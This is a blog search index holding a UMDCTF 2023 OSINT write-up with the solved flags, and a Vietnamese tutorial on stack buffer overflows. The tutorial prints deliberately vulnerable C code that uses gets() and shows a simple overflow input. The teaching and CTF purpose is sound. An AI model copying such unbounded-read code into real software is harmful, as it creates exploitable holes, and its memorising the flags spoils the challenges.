p1ku\u0026rsquo;s email on Google and found his resume (his email can be found on the contact page if you didn\u0026rsquo;t know).\nIn the Professional Experience section, we learned that he works at Leidos.\nThe third question: What is bree\u0026rsquo;s favorite CTF category? In his profile on the members\u0026rsquo; page, there is a hashtag #miscgang. We can assume the answer is misc.\nThe last question: What is the brand name of the gift that blub is going to buy? We found a thread titled Gift in their Discord server.\nFrom the Amazon link and p1ku\u0026rsquo;s statement that there has to be a list they made, we can guess that the couple may have created an Amazon wedding registry. Searching for Bulberina - the name blub mentioned - we found their wedding registry (confirmed by the Hasbulla cutout on their list).\nBlub mentioned that it\u0026rsquo;s some kind of storage thing. After a few attempts, we discovered the correct gift. The answer is Shazo.\nAfter providing all the answers, we received the flag UMDCTF{y0u_sur3_kn0w_h0w_t0_d0_y0ur_r3s3@rch_289723}\nTCC3 # Description: I\u0026rsquo;m missing contact information for one of the members. They said they were Out of Office (OOO) on vacation.\nUpon researching the term Out of Office (OOO), we learned that it is an automated email response sent to anyone who emails you while you\u0026rsquo;re away. In the contact page, mach0\u0026rsquo;s email is missing. We can assume the member they mentioned is mach0. We also noticed a pattern in the members\u0026rsquo; emails:\np1ku: p1ku.umdctf2023@gmail.com\nchadizard: chadizard.umdctf2023@gmail.com\nbree: bree.umdctf2023@gmail.com\nblub: blub.umdctf2023@gmail.com\ntitos: titos.umdctf2023@proton.me\nCould mach0\u0026rsquo;s email follow this pattern as well? We assumed it is mach0.umdctf2023@gmail.com. Based on the Out of Office (OOO) hint, we tried sending an email to him. Surprisingly, we received a response.\nHe left his telephone number (281) 698-0109. Suspecting he may have left a message on his phone, we called the number and found a voicemail. We recorded it, and you can access it here. The flag is UMDCTF{y0u_h4v3_r3ach3d_mach0_v01cema1l_333}\nTCC4 # Description: mach0 told me he has been tweeting a lot and might expose TCC secrets!\nWe noticed that mach0 always ends his sentences with - macho in Discord.\nWe speculated he could do the same in his tweets. Searching the query \u0026quot;- macho\u0026quot; lang:en until:2023-05-01 since:2023-04-01 and sifting through thousands of tweets, we finally found his account here. We saw a pastebin in one of his tweets. We clicked on the link and obtained the flag: UMDCTF{tw1tt3r_adv4nc3d_s3arch_y0ink}\nConclusion # In this challenge, we successfully investigated the hacker group through various OSINT techniques, including using the Wayback Machine, researching team rankings, exploring email patterns, and examining social media. We managed to find the flags in each step by digging deep into the information available and making educated guesses. This challenge emphasizes the importance of thorough research and persistence in solving complex problems. Overall, I would rate this challenge a 4 out of 5. The challenge required a combination of research skills, attention to detail, and creative thinking to successfully complete each step. The difficulty level made the challenge engaging and rewarding, while still being approachable for those with intermediate OSINT experience.\n","date":"2 May 2023","permalink":"/writeup/umd-osint/","section":"Writeups","summary":"An in-depth writeup on UMDCTF 2023 - TCC1-4.","title":"UMDCTF 2023 - TCC1-4 writeup"},{"content":"","date":"30 April 2023","permalink":"/series/pwn-101/","section":"Series","summary":"","title":"pwn 101"},{"content":"Disclaimer # Series Pwn 101 này mình viết cho vui trong lúc rảnh nhằm mục đích chia sẻ lại mấy cái kiến thức mà mình học được (hoặc tự mình hiểu được nó là như thế) cũng như kinh nghiệm từ khi mới bắt đầu theo mảng Pwnable cho đến giờ. Mấy cái mớ trong này chưa chắc đã đúng hết 100% nhưng nếu thấy không vừa mắt thì cứ coi như là mình viết linh tinh rồi tắt tab này đi là được.\nBuffer Overflow là gì? # Well, theo như con ChatGpt nó gen cho mình thì, để chép nguyên văn luôn.\nLỗi buffer overflow là một lỗi bảo mật phổ biến trong các ứng dụng máy tính, đặc biệt là trong các chương trình được viết bằng các ngôn ngữ lập trình thấp như C và C++. Nó xảy ra khi một chương trình cố gắng ghi vào một vùng nhớ đệm (buffer) vượt quá kích thước đã cấp phát cho nó, gây ra việc ghi đè dữ liệu vào vùng nhớ khác trong bộ nhớ hoặc thậm chí là tràn ra ngoài vùng nhớ của chương trình, gây ra lỗi hoặc crash chương trình. Nói chung là, chương trình nó cho bạn cái vùng nhớ rộng 10 bytes, nhưng không nói là bạn được viết bao nhiêu byte, thế là bạn viết cmn 11 bytes hay thậm chí 69420 bytes nó vẫn lấy hết và điều này gây ra lỗi.\nLỗi Buffer Overflow (tràn bộ đệm) là một trong những lỗi chương trình phổ biến mà các pwner thường khai thác, và cùng là nền tảng cho những kỹ thuật pwn phức tạp như ret2shell, ret2libc, ROP, \u0026hellip;\nĐịnh vị Buffer Overflow như thế nào? # Cái này thì vô số biến thể luôn, nhưng chung quy lại thì vẫn là chương trình nó cho phép bạn ghi vào một cái vùng nhớ nhiều dữ liệu hơn mức cái vùng nhớ đó chứa được. Để dễ tiếp cận hơn một cách cơ bản thì hãy cùng xem qua ví dụ sau.\n#include \u0026lt;stdio.h\u0026gt; void main() { int num = 0; char buffer[10]; gets(buffer); return 0; } Một đoạn code C trông có vẻ vô hại. Chương trình này khai báo một biến num kiểu int có giá trị bằng 0 và một biến buffer là dãy 10 ký tự kiểu char. Sau đó chương trình tiến hành lấy chuỗi input từ người dùng nhập vào biến buffer và kết thúc chương trình mà không làm gì cả.\nNhưng nếu chương trình thật sự làm gì đó thì sao? Hãy modify cái chương trình này lại một xíu nhé.\n#include \u0026lt;stdio.h\u0026gt; void main() { int num = 0; char buffer[10]; gets(buffer); if(num != 0) { puts(\u0026#34;Wait... How?!\u0026#34;); } return 0; } Tại đây ta thấy, sau khi chương trình nhận vào input của người dùng bỏ vào biến buffer thì sẽ kiểm tra giá trị của biến num xem có khác giá trị 0 hay không. Trong suốt quá trình chạy chương trình, ta không hề thực hiện bất kỳ một tác vụ nào làm thay đổi biến num nên xét theo lẽ thường, điều kiện if không thể đạt được.\nVấn đề đặt ra ở đây là liệu có cách nào để thay đổi biến num khi chạy chương trình trên hay không? Câu trả lời là có.\nMemory Layout trên kiến trúc Intel # Thông thường, trong kiểu kiến trúc intel x86, các biến local của hàm khi khai báo sẽ được lưu vào trong vùng nhớ stack, và khi ta compile chương trình bằng gcc, các biến có kiểu dữ liệu kích thước cố định sẽ được ưu tiên xếp ở dưới.\nThêm một điều nữa, vì intel x86 là kiểu kiến trúc Little Endian nên ngoại trừ các chuỗi ký tự, khi chương trình tiến hành đọc hay lưu dữ liệu tại địa chỉ của vùng nhớ bất kỳ thì các byte giá trị sẽ được xếp ngược lại. Tức là nếu địa chỉ chứa một biến có kiểu dữ liệu int (4 bytes) đang hiển thị là 0x04030201 thì các byte của nó có thứ tự là 01 02 03 04.\nVậy nên theo như các biến ta đã khai báo như trên thì vùng nhớ sẽ cơ bản được thiết lập như sau:\nbắt đầu của buffer | V | 00 00 | kết thúc | 00 00 00 00 | của buffer -\u0026gt; | 00 00 00 00 | | 00 00 00 00 | \u0026lt;- kết thúc của num ^ | bắt đầu của num Do đó ta có thể thấy, khác với địa chỉ bắt đầu của chuỗi buffer là nằm ở trên cùng và đọc dần xuống dưới cuối theo thứ tự từ phải sang trái, khi ta đọc biến num thì chương trình sẽ tự hiểu và đọc ngược các byte từ cuối về đầu, tức là từ trái sang phải. Đừng hỏi mình, cái memory nó xếp như vậy mình đâu có thiết kế mấy cái củ shit này.\nÔng nào học môn Kiến trúc máy tính xong có khi sẽ hiểu sơ sơ cái này còn không thì tạm thời cứ cho là như vậy trước đi.\nViệc nguy hiểm khi sử dụng các hàm đọc không giới hạn # Quay trở lại vấn đề chính, đầu tiên hãy nhìn vào Linux Programmer’s Manual dành cho hàm gets. Ta biết được rằng hàm gets đọc một dòng từ stdin vào bộ đệm (buffer) được trỏ tới bởi tham số con trỏ s và dừng lại cho đến khi gặp ký tự xuống dòng (‘\\n’) hoặc ký tự EOF (End of File). Không những thế, ta con nhận được một dòng cảnh báo được gạch chân rất rõ ràng: “Đừng bao giờ sử dụng hàm này.”\nGETS(3) Linux Programmer\u0026#39;s Manual GETS(3) NAME gets - get a string from standard input (DEPRECATED) SYNOPSIS #include \u0026lt;stdio.h\u0026gt; char *gets(char *s); DESCRIPTION Never use this function. gets() reads a line from stdin into the buffer pointed to by s until either a terminating newline or EOF, which it replaces with a null byte (\u0026#39;\\0\u0026#39;). No check for buffer overrun is performed (see BUGS below). RETURN VALUE gets() returns s on success, and NULL on error or when end of file occurs while no characters have been read. However, given the lack of buffer overrun checking, there can be no guarantees that the function will even return. BUGS Never use gets(). Because it is impossible to tell without knowing the data in advance how many characters gets() will read, and because gets() will continue to store characters past the end of the buffer, it is extremely dangerous to use. It has been used to break computer security. Use fgets() instead. Bản chất của hàm gets là đọc vào chuỗi ký tự từ người dùng hoặc từ file, tuy nhiên nó lại không hề kiểm tra số lượng ký tự mà nó nhận vào. Chính do đó mà cho đến khi chưa gặp ký tự xuống dòng hoặc EOF thì nó vẫn sẽ tiếp tục đọc, và điều này dẫn đến một lỗi vô cùng phổ biến đó chính là Buffer Overflow.\nKhai thác Buffer Overflow để thay đổi biến local # Giả sử ta nhập vào một chuỗi 10 ký tự ‘a’ (mã hex 0x61). Hàm gets đọc vào chuỗi này và tiến hành lưu vào trong vùng nhớ từ bắt đầu của biến buffer cho đến kết thúc của biến buffer, vừa vặn 10 bytes. Mọi thứ diễn ra như bình thường, chương trình chạy đúng như những gì chúng ta dự đoán lúc trước và không có điều gì kỳ lạ xảy ra cả.\nLúc này vùng nhớ của ta sẽ như sau:\nbắt đầu của buffer | V | 61 61 | kết thúc | 61 61 61 61 | của buffer -\u0026gt; | 61 61 61 61 | | 00 00 00 00 | \u0026lt;- kết thúc của num ^ | bắt đầu của num Nhưng nếu ta nhập vào chuỗi 11 ký tự ‘a’ thì sao?\nHàm gets vẫn sẽ nhận vào chuỗi 11 ký tự đó, tiến hành lưu vào vùng nhớ từ bắt đầu của biến buffer cho đến kết thúc của biến buffer, nhưng độ dài vùng nhớ của biến này chỉ có 10 bytes. Câu hỏi đặt ra là: byte thứ 11 sẽ đi về đâu?\nCâu trả lời chính là nó sẽ tràn xuống vùng nhớ ở dưới, không đâu khác chính là vùng nhớ của biến num.\nbắt đầu của buffer | V | 61 61 | kết thúc | 61 61 61 61 | của buffer -\u0026gt; | 61 61 61 61 | | 00 00 00 61 | \u0026lt;- kết thúc của num ^ | bắt đầu của num Vậy khi này nếu như chương trình tiến hành đọc dữ liệu của biến num thì nó sẽ không còn mang giá trị 0 như ban đầu nữa mà lại là 0x61 (hay 0x00000061), tức bằng 97. Ta đã có thể thay đổi được giá trị của biến num và điều chỉnh được luồng thực thi của chương trình.\n$ ./test aaaaaaaaaaa Wait... How?! Nếu nhập vào nhiều ký tự hơn nữa, ta không những có thể ghi đè lên biến num mà còn tiếp tục ghi đè xuống được vùng nhớ ở dưới biến num. Nhưng vấn đề này sẽ được đè cập tới ở phần tiếp theo, trong một kỹ thuật khác bắt nguồn từ việc khai thác lỗi Buffer Overflow này.\nMột lưu ý nho nhỏ, là đối với các phiên bản gcc mới hơn, compiler sẽ luôn ưu tiên đặt các biến buffer ở vùng địa chỉ cao hơn các biến riêng lẻ khác (tức là nằm ở dưới trong stack) vậy nên việc ghi đè lên biến num như ví dụ trên sẽ không còn khả thi nữa.\nTrên thực tế, không chỉ mỗi hàm gets mà còn có nhiều những hàm khác có thể gây nên lỗi tràn bộ đệm. Và việc tràn bộ đệm này có thể giúp các attacker thay đổi được luồng thực thi của chương trình, và hơn nữa là chiếm được shell của hệ thống.\n","date":"30 April 2023","permalink":"/sharing/pwn101/buffer_overflow_1/","section":"Sharings","summary":"Buffer Overflow là gì? Điều gì gây nên lỗi tràn bộ đệm? Làm sao để khai thác?","title":"Pwn 101: Buffer Overflow Part 1"},{"content":"","date":"30 April 2023","permalink":"/series/","section":"Series","summary":"","title":"Series"},{"content":"","date":"30 April 2023","permalink":"/sharing/","section":"Sharings","summary":"","title":"Sharings"},{"content":"About me # Just a weeb.\n","date":"6 December 2003","permalink":"/authors/baodoktah/","section":"Authors","summary":"Misc and OSINT enjoyer","title":"BaoDoktah"},{"content":"About me # Wibu tiến hóa theo nhánh yuri enjoyer. Bị chuẩn đoán mắc chứng nghiện gacha mãn tính.\nChơi pwn vì quá ngu toán để theo mảng crypto, quá lười đọc code để theo mảng RE và quá lười học html, js\u0026hellip; để theo mảng web (đang cố).\nCấp 3 làm HSG Địa Lý, ban đầu dự định theo hải dương hoặc địa chất ai ngờ vì simp nghe gái mà phải làm sanh diên trường B.\nTrước đây từng có ý định theo ngành lập trình game, ma xui quỷ khiến thế nào mà giờ thành hecker cmnl. Bởi vậy người ta nói cuộc đời không tính trước được cái quỷ gì cả.\nKhông sợ ma quỷ, chỉ sợ heap. Có lần tôi nằm mơ thấy ma, tụi nó đang bị malloc và free hù cho khiếp sợ.\n","date":"26 March 2003","permalink":"/authors/lio/","section":"Authors","summary":"Woah! Một páo-ner hoang dã đã xuất hiện!","title":"Lio"},{"content":"","date":"1 January 0001","permalink":"/categories/","section":"Categories","summary":"","title":"Categories"}]